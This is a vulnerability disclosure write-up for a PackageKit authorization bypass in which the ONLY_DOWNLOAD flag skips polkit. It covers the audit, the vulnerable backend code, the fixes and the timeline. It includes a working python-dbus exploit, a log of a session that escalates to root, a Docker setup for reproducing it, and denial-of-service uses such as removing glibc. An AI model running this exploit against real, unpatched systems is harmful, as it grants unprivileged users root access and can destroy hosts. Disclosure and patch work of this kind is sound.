# CVE-2026-55752: PackageKit's ONLY_DOWNLOAD flag skips polkit, and four backends install and remove anyway

**Published:** 2026-09-14 **Reported:** 2026-05-21 **Severity:** 8.8 High **Status:** Fixed in PackageKit 1.4.0 (GHSA-x282-cq95-f96w) **CWE:** CWE-862 (Missing Authorization)

---

PackageKit's daemon skips the polkit authorization check entirely when a transaction carries the `ONLY_DOWNLOAD` flag. That is deliberate: downloading packages is not a system modification, so it does not need an authentication prompt. The safety of that shortcut rests on a contract — every backend must honor `ONLY_DOWNLOAD` and refuse to install or remove. Four backend handlers never read the flag. An unprivileged local user opens a D-Bus transaction, sets `transaction_flags = 8`, calls `RemovePackages`, and packagekitd removes the package as root with no prompt, running the package's `pre_remove` scriptlet as root on the way out. Assigned CVE-2026-55752, rated High (CVSS 8.8), fixed in PackageKit 1.4.0.

---

## Background: the contract, and the previous fix that did not fix it

In February 2026, GHSA-wpcw-g86j-489v reported exactly this shape against the Slackware backend: `ONLY_DOWNLOAD` skips polkit in the core, the slack backend ignored the flag, unprivileged callers got install and remove as root.

The fix that shipped in 1.3.5, commit `8c629aab9`, deleted the entire `backends/slack/` directory.

That removes one caller of a broken contract. It does not fix the contract, and it does not touch the core short-circuit that makes the contract load-bearing in the first place. April's Pack2TheRoot fix (CVE-2026-41651, commit `76cfb675f`) added a `state == NEW` check at the method dispatcher, which closes a TOCTOU race on `cached_transaction_flags` but likewise leaves the `ONLY_DOWNLOAD` polkit bypass in place.

So the obvious question: which of the *remaining* backends break the same contract? I audited the backend tree at `main` HEAD `9372117` (2026-05-18). Four sibling paths do.

## The core short-circuit

`src/pk-transaction.c`, in `pk_transaction_obtain_authorization`:

```c
/* we don't need to authenticate at all to just download
 * packages or if we're running unit tests */
if (pk_bitfield_contain (transaction->cached_transaction_flags,
             PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD) ||
        pk_bitfield_contain (transaction->cached_transaction_flags,
             PK_TRANSACTION_FLAG_ENUM_SIMULATE) ||
        transaction->skip_auth_check == TRUE) {
    g_debug ("No authentication required");
    pk_transaction_set_state (transaction, PK_TRANSACTION_STATE_READY);
    return TRUE;
}
```

The flag is attacker-controlled. It arrives as the first argument of every state-changing D-Bus method, and the caller is any local uid with a system bus connection. Note what the check does *not* consult: the transaction's role. `REMOVE_PACKAGES` with `ONLY_DOWNLOAD` set is nonsense — there is nothing to download when you are uninstalling — and the core happily waves it through anyway.

## The variant hunt

Per backend, at commit `9372117`, does the handler branch on `ONLY_DOWNLOAD` before committing?

| Backend | `install_packages` | `install_files` | `remove_packages` |
|---------|--------------------|-----------------|-------------------|
| dnf     | honors | honors | honors |
| dnf5    | honors | honors | honors |
| zypp    | honors (commit policy `DownloadOnly`) | n/a | honors |
| poldek  | honors | n/a | n/a |
| alpm    | honors (`ALPM_TRANS_FLAG_DOWNLOADONLY` in `pk-alpm-sync.c`) | **ignores** | **ignores** |
| freebsd | honors (`PKG_FLAG_SKIP_INSTALL`) | n/a | **ignores** |
| portage | honors (passes `only_download` through) | n/a | **ignores** |

The interesting detail is that three of the four vulnerable handlers sit directly next to a sibling handler in the same backend that gets it right. alpm's `install_packages` sets `ALPM_TRANS_FLAG_DOWNLOADONLY`; alpm's `install_files` and `remove_packages` do not. freebsd's `install_packages` passes `PKG_FLAG_SKIP_INSTALL`; freebsd's `remove_packages` does not. portage reads `_is_only_download` in `_install_packages` and never consults it in `_remove_packages`.

Nobody forgot that the flag exists. They forgot it on the paths where "download-only" reads as meaningless, which is exactly where the core's short-circuit still applies.

## The four handlers

**alpm `remove_packages`** — `backends/alpm/pk-alpm-remove.c`. This is the primary path, and the one in the PoC below:

```c
static void
pk_backend_remove_packages_thread (PkBackendJob *job, GVariant* params, gpointer p)
{
    alpm_transflag_t flags = 0;
    ...
    g_variant_get (params, "(t^a&sbb)",
            &transaction_flags, &package_ids, &allow_deps, &autoremove);
    ...
    if (pk_alpm_transaction_initialize (job, flags, NULL, &error) &&
        pk_alpm_transaction_remove_targets (job, package_ids, &error) &&
        pk_alpm_transaction_remove_simulate (job, &error)) {
        if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE)) {
            pk_alpm_transaction_packages (job);
        } else {
            pk_alpm_transaction_commit (job, &error);    /* real remove */
        }
    }
}
```

`transaction_flags` is read off the wire and tested for exactly one bit. `ONLY_DOWNLOAD` falls through to `pk_alpm_transaction_commit`, which performs the uninstall and runs the package's `pre_remove` and `post_remove` scriptlets as root.

**alpm `install_files`** — `backends/alpm/pk-alpm-install.c`. Checks `SIMULATE` and `ONLY_TRUSTED` only, and passes a hardcoded `0` as the alpm transaction flags, so `ALPM_TRANS_FLAG_DOWNLOADONLY` never reaches libalpm either. On a host where `SigLevel` is relaxed, this is root RCE from an attacker-authored `.INSTALL` `post_install` scriptlet — scope-changing, CVSS 8.8.

**freebsd `remove_packages`** — `backends/freebsd/pk-backend-freebsd.cpp`. Checks `SIMULATE` only; `jobs.apply()` runs libpkg's deinstall, which executes `+PRE_DEINSTALL` as root.

**portage `_remove_packages`** — `backends/portage/portageBackend.py`. Checks `_is_simulate` only; the unmerge runs `pkg_prerm` as root.

## PoC

Default `archlinux:latest` container, stock config, no `SigLevel` relaxation. `test-target` is a package whose `pre_remove` scriptlet writes a proof file and drops `/etc/sudoers.d/pwn`, installed by root beforehand. Everything below runs as `attacker`, uid 1000:

```
$ id
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker)

$ sudo -n id
sudo: a password is required

$ python3 /tmp/exploit_remove.py
Transaction: /1_beedaace
Calling RemovePackages(flags=8, [test-target...], allow_deps=False, autoremove=False)
RemovePackages returned normally

$ pacman -Q test-target
error: package 'test-target' was not found

$ cat /tmp/PKKIT_REMOVE_PROOF
REMOVE scriptlet ran. uid=0 euid=root at Thu May 21 05:53:43 UTC 2026

$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit is 25 lines of `python-dbus`. There is no race, no heap grooming, no second stage — the whole thing is one method call with one bit set:

```python
#!/usr/bin/env python3
import dbus
bus = dbus.SystemBus()

pk = bus.get_object("org.freedesktop.PackageKit", "/org/freedesktop/PackageKit")
tid = dbus.Interface(pk, "org.freedesktop.PackageKit").CreateTransaction()

tx = bus.get_object("org.freedesktop.PackageKit", tid)
tx_iface = dbus.Interface(tx, "org.freedesktop.PackageKit.Transaction")

# RemovePackages(transaction_flags, package_ids, allow_deps, autoremove)
# flags=8 = PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD
tx_iface.RemovePackages(dbus.UInt64(8),
                        dbus.Array(["test-target;1-1;any;installed"], signature="s"),
                        False, False)
```

The daemon log from the same run shows the bypass on the wire:

```
PackageKit RemovePackages method called: test-target;1-1;any;installed, 0, 0 (transaction_flags: only-download)
PackageKit No authentication required
PackageKit transaction now running
PackageKit setting role for /1_beedaace to remove-packages
PackageKit emit package removing, test-target;1-1;any;installed
PackageKit transaction now finished
```

`No authentication required`, on a `remove-packages` role, from uid 1000.

Environment, if you want to rebuild it:

```bash
docker run -d --name pkkit-test --hostname arch-pkkit archlinux:latest sleep infinity
docker exec pkkit-test bash -c 'pacman -Syu --noconfirm && \
  pacman -S --noconfirm packagekit dbus polkit base-devel sudo python-dbus shared-mime-info && \
  update-mime-database /usr/share/mime && useradd -m -s /bin/bash attacker && \
  mkdir -p /run/dbus /etc/sudoers.d && dbus-daemon --system --fork && sleep 1 && \
  G_MESSAGES_DEBUG=all nohup /usr/lib/packagekitd --verbose > /tmp/pkd.log 2>&1 &'
```

## Impact

The precondition is a connection to the system bus. Every interactive local user has one. No `wheel`, no `sudo` group, no filesystem access to anything privileged, no physical access — `PR:L` in CVSS terms. From there, three distinct paths open, and they do not all require the same setup:

**a) Denial of service, no prior anything.** `RemovePackages(flags=8, ["linux"])`, or `systemd`, or `glibc`, or `openssh`. The package is removed as root. The host does not come back from a reboot. No package authored by the attacker, no admin involvement at any step.

**b) Root code execution through someone else's scriptlet.** `RemovePackages(flags=8, [<any installed package with a non-trivial pre_remove>])`. Removal scriptlets are written by upstream maintainers, not by the attacker; the attacker only needs to find one already on the box that does something useful as root — touches `/etc/sudoers.d/`, writes a unit file, restarts a service, drops a SUID binary, fires a pacman hook. Still no prior install by the attacker.

**c) Root code execution through the attacker's own package.** The path in the PoC above, and the one that maps onto `install_files` on SigLevel-relaxed hosts. This is the only path that needs a package the attacker authored to be on the system first.

During triage a maintainer pushed back that installing a malicious package already requires authorization, so the severity should drop. That objection is fair, but it only covers path (c). Paths (a) and (b) require no prior authorization at any step, and the structural precedent — GHSA-wpcw-g86j-489v, same bug class, same "local auth bypass → DoS / root code execution" framing — was accepted as High.

**CVSS 3.1:** 8.8 High, `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`, credited to the `install_files` path where the scope change applies. The three `remove_packages` paths score 7.8 (`S:U`) on default configuration.

Affected: PackageKit `>= 1.0.2` through 1.3.x, on any system using the alpm, freebsd, or portage backend — Arch, Manjaro, EndeavourOS, KaOS, FreeBSD, Gentoo. PackageKit is not usually installed deliberately; it arrives as a dependency of GNOME Software and KDE Discover.

## Fix

Two layers, and both landed.

**Per backend** (commit `62c0620b7`): the four handlers now take the same report-only branch they already took for `SIMULATE`. Four files, +12/−6:

```c
-		if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE)) { /* simulation */
+		if (pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_SIMULATE) ||
+		    pk_bitfield_contain (transaction_flags, PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD)) { /* simulate or download-only (no-op for remove) */
 			pk_alpm_transaction_packages (job);
 		}
 		else {
```

For the three remove handlers that is the whole fix — a removal has nothing to download, so download-only is a no-op and report-only is the semantically correct behavior.

`install_files` needed a second pass. Ximion pointed out on review that the report-only branch quietly dropped the *download* half of the semantics: a local package can still have missing dependencies, and `ONLY_DOWNLOAD` is supposed to fetch them. Commit `9705bda82` fixes it the way `pk-alpm-sync.c` already did, by handing the flag to libalpm instead of branching around it:

```c
	if (pk_bitfield_contain (flags, PK_TRANSACTION_FLAG_ENUM_ONLY_DOWNLOAD))
		alpm_flags |= ALPM_TRANS_FLAG_DOWNLOADONLY;
```

Dependencies land in the cache, the local package is never extracted, no scriptlet runs. Verified against a daemon built from that branch: a malicious package depending on an uninstalled `cowsay`, invoked with `InstallFiles(flags=8, ...)`, downloads `cowsay` and installs nothing.

**In the core** (commit `b6fa73b3a`, shipped in 1.3.6): `ONLY_DOWNLOAD` is now whitelisted per transaction role rather than blanket-accepted. `REMOVE_PACKAGES` is not in `pk_transaction_role_supports_only_download`, so the nonsensical combination that started all of this is rejected before a backend ever sees it. This is the defense-in-depth layer that catches the next backend to forget the flag.

Fixed in PackageKit 1.4.0.

## Disclosure

- **2026-05-18** — audit starts against `main` HEAD `9372117`
- **2026-05-21** — live PoC on stock Arch; reported privately via GitHub security advisory
- **2026-05-21** — backend patch merged (`62c0620b7`)
- **2026-06-16** — core role whitelist merged (`b6fa73b3a`), ships in 1.3.6
- **2026-06-17** — CVE-2026-55752 assigned; `install_files` download semantics follow-up merged (`9705bda82`)
- **2026-09-09** — GHSA-x282-cq95-f96w published, fixes ship in 1.4.0

Co-reported with Leyner Garzon (crossmarkx). Thanks to Richard Hughes, Matthias Klumpp and Gleb Popov for the triage, the review that caught the `install_files` regression, and the core-level fix.

## Takeaway

The bug was not in code anyone wrote wrong. `pk_alpm_transaction_commit` does what it says; the polkit short-circuit does what its comment says. The bug is in the seam: the core relaxes authorization on the strength of a promise, and nothing in the tree checks that the promise is kept. GHSA-wpcw-g86j-489v found one backend breaking it and the response was to delete that backend — which treats a contract violation as a property of the violator.

When a fix deletes the caller instead of enforcing the invariant, the remaining callers are worth reading. Four of them were.

## Links

- Advisory: https://github.com/PackageKit/PackageKit/security/advisories/GHSA-x282-cq95-f96w
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-55752
- Backend fix: https://github.com/PackageKit/PackageKit/commit/62c0620b70feb366a9fc21a5744917e56942a569
- `install_files` download semantics: https://github.com/PackageKit/PackageKit/commit/9705bda82b955cbc849dd53e1a4d0121d5b0b109
- Core role whitelist: https://github.com/PackageKit/PackageKit/commit/b6fa73b3af5845d5071140433bd136b057bcbebc
- Parent advisory (slack backend): https://github.com/PackageKit/PackageKit/security/advisories/GHSA-wpcw-g86j-489v
- Pack2TheRoot (CVE-2026-41651): https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv
- CWE-862: https://cwe.mitre.org/data/definitions/862.html
